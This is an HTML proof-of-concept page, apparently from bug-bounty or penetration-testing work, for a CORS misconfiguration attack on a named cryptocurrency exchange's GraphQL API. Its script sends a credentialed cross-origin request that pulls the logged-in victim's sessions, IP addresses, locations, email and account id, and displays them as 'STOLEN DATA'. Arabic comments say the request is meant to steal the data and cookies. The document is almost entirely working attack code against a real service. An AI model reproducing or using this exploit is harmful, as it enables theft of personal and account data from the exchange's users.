<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Data Theft PoC</h1>
    <div id="results" style="border: 2px solid red; padding: 20px; background: #ffeeee;">
        <h3>Waiting for stolen data...</h3>
    </div>

    <script>
        var xhr = new XMLHttpRequest();
        var url = "https://profile.cex.io/account-api/graphql";
        
        // البيانات اللي بتسرقها (لازم تكون نفس الـ Query اللي في Burp عندك)
        var query = JSON.stringify({
            "operationName": "sessionManager", 
            "variables": {},
            "query": "query sessionManager { sessions { id ip location } me { email id displayName } }"
        });

        xhr.open("POST", url, true);
        xhr.withCredentials = true; // دي اللي بتخليه يسرق الكوكيز
        xhr.setRequestHeader("Content-Type", "application/json");

        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                var responseDiv = document.getElementById("results");
                if (xhr.status == 200) {
                    responseDiv.innerHTML = "<h2>✅ STOLEN DATA:</h2><pre>" + 
                        JSON.stringify(JSON.parse(xhr.responseText), null, 2) + "</pre>";
                } else {
                    responseDiv.innerHTML = "<h2>❌ Failed! Status: " + xhr.status + "</h2>";
                }
            }
        };

        xhr.send(query);
    </script>
</body>
</html>